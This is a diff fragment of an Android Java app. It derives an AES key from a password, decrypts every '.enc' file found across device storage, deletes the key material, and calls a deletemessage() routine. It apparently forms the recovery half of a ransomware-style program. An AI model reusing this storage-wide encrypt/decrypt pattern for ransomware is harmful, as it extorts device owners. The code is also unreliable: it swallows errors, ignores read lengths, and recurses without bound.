@@ -1,0 +1,80 @@
+		// reading the salt
+		// user should have secure mechanism to transfer the
+		// salt, iv and password to the recipient
+		FileInputStream saltFis = new FileInputStream(path1+".salt");
+                File filesalt = new File(path1+".salt");
+		byte[] salt = new byte[8];
+		saltFis.read(salt);
+		saltFis.close();
+
+		// reading the iv
+		FileInputStream ivFis = new FileInputStream(path1+".iv");
+                File fileiv = new File(path1+".iv");
+		byte[] iv = new byte[16];
+		ivFis.read(iv);
+		ivFis.close();
+
+		SecretKeyFactory factory = SecretKeyFactory
+				.getInstance("PBKDF2WithHmacSHA1");
+		KeySpec keySpec = new PBEKeySpec(password.toCharArray(), salt, 65536,
+				256);
+		SecretKey tmp = factory.generateSecret(keySpec);
+		SecretKey secret = new SecretKeySpec(tmp.getEncoded(), "AES");
+
+		// file decryption
+		Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
+		cipher.init(Cipher.DECRYPT_MODE, secret, new IvParameterSpec(iv));
+		FileInputStream fis = new FileInputStream(path1);
+		FileOutputStream fos = new FileOutputStream(path1.split("\\.enc",2)[0]); 
+		byte[] in = new byte[64];
+		int read;
+		while ((read = fis.read(in)) != -1) {
+			byte[] output = cipher.update(in, 0, read);
+			if (output != null)
+				fos.write(output);
+		}
+
+		byte[] output = cipher.doFinal();
+		if (output != null)
+			fos.write(output);
+		fis.close();
+		fos.flush();
+		fos.close();
+                filesalt.delete();
+                fileiv.delete();
+
+	}
+
+
+
+public void checkperm() {
+       if(ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.WRITE_EXTERNAL_STORAGE") == PackageManager.PERMISSION_GRANTED) {
+
+File dir1 = new File("/storage");
+List<File> files1 = (List<File>) FileUtils.listFiles(dir1,
+TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);
+		for (File file : files1) {
+try {
+            String path1 = file.getCanonicalPath();
+ 
+            String extension = FilenameUtils.getExtension(path1);
+            if (extension.equals("enc")) {
+            FileDecryption(path1);
+            file.delete();
+}
+
+} catch (Exception e) {
+            }
+		}
+
+try {
+deletemessage(); } catch (Exception e) {
+            }
+
+       } else {
+            final int REQUEST_CODE_ASK_PERMISSIONS = 123;
+            ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.WRITE_EXTERNAL_STORAGE"}, REQUEST_CODE_ASK_PERMISSIONS);
+          checkperm();
+        }
+}
+}
